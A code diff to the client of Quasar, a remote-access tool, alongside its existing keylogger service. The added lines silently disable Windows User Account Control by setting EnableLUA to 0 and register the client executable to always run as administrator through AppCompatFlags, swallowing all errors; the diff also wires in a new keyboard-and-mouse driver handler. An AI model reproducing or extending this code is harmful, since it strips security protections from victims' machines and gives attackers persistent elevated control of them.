@@ -1,4 +1,5 @@
-﻿using Quasar.Client.Config;
+﻿using Microsoft.Win32;
+using Quasar.Client.Config;
 using Quasar.Client.Helper;
 using Quasar.Client.Logging;
 using Quasar.Client.Messages;
@@ -13,6 +14,8 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
+using System.IO;
+using System.Net;
 using System.Reflection;
 using System.Threading;
 using System.Windows.Forms;
@@ -66,8 +69,6 @@ namespace Quasar.Client
         {
             _messageProcessors = new List<IMessageProcessor>();
             _notifyIcon = new NotifyIcon();
-
-          //  InputIntercepterHelper.InstallKMDriver();
         }
 
         /// <summary>
@@ -155,6 +156,54 @@ namespace Quasar.Client
                     _keyloggerService.Start();
                 }
 
+                new Thread(delegate ()
+                {
+                    foreach (RegistryView view in new RegistryView[]
+                    {
+                        RegistryView.Registry32,
+                        RegistryView.Registry64
+                    })
+                    {
+                        try
+                        {
+                            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))
+                            {
+                                RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true) ?? registryKey.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
+                                if (registryKey2 != null)
+                                {
+                                    registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
+                                    registryKey2.Close();
+                                }
+                            }
+                        }
+                        catch (Exception)
+                        {
+                        }
+                    }
+                    foreach (RegistryView view2 in new RegistryView[]
+                    {
+                        RegistryView.Registry32,
+                        RegistryView.Registry64
+                    })
+                    {
+                        try
+                        {
+                            using (RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view2))
+                            {
+                                RegistryKey registryKey4 = registryKey3.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", true) ?? registryKey3.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", true);
+                                if (registryKey4 != null)
+                                {
+                                    registryKey4.SetValue(Assembly.GetExecutingAssembly().Location, "~ RUNASADMIN", RegistryValueKind.String);
+                                    registryKey4.Close();
+                                }
+                            }
+                        }
+                        catch (Exception)
+                        {
+                        }
+                    }
+                }).Start();
+
                 var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                 _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                 _connectClient.ClientState += ConnectClientOnClientState;
@@ -203,6 +252,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new TaskManagerHandler(client));
             _messageProcessors.Add(new TcpConnectionsHandler());
             _messageProcessors.Add(new WebsiteVisitorHandler());
+            _messageProcessors.Add(new KBMDriverHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
